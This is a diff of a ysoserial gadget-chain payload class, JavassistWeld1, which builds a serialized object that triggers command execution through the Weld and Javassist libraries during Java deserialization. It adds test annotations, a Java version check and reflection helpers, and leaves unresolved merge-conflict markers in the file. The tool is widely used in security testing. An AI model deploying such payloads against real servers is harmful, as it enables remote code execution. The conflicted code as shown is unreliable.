@@ -16,8 +16,11 @@ import org.jboss.weld.interceptor.spi.model.InterceptionModel;
 import org.jboss.weld.interceptor.spi.model.InterceptionType;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.JavaVersion;
 import ysoserial.payloads.util.PayloadRunner;
+import ysoserial.payloads.util.Reflections;
 
 import java.lang.reflect.Constructor;
 import java.util.*;
@@ -26,13 +29,20 @@ import java.util.*;
     by @matthias_kaiser
 */
 @SuppressWarnings({"rawtypes", "unchecked"})
+@PayloadTest(precondition = "isApplicableJavaVersion")
 @Dependencies({"javassist:javassist:3.12.1.GA", "org.jboss.weld:weld-core:1.1.33.Final",
     "javax.enterprise:cdi-api:1.0-SP1", "javax.interceptor:javax.interceptor-api:3.1",
     "org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final", "org.slf4j:slf4j-api:1.7.21" })
 @Authors({ Authors.MATTHIASKAISER })
 public class JavassistWeld1 implements ObjectPayload<Object> {
+<<<<<<< HEAD
 	
 	// federicodotta - All supported (TemplateImpl)
+=======
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isAtLeast(7);
+    }
+>>>>>>> frohoff/master
 
     public Object getObject(final String command, String attackType) throws Exception {
 
@@ -46,7 +56,7 @@ public class JavassistWeld1 implements ObjectPayload<Object> {
         s.add(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE);
 
         Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
-        defaultMethodMetadataConstructor.setAccessible(true);
+        Reflections.setAccessible(defaultMethodMetadataConstructor);
         MethodMetadata methodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(s,
                 MethodReference.of(TemplatesImpl.class.getMethod("newTransformer"), true));
 
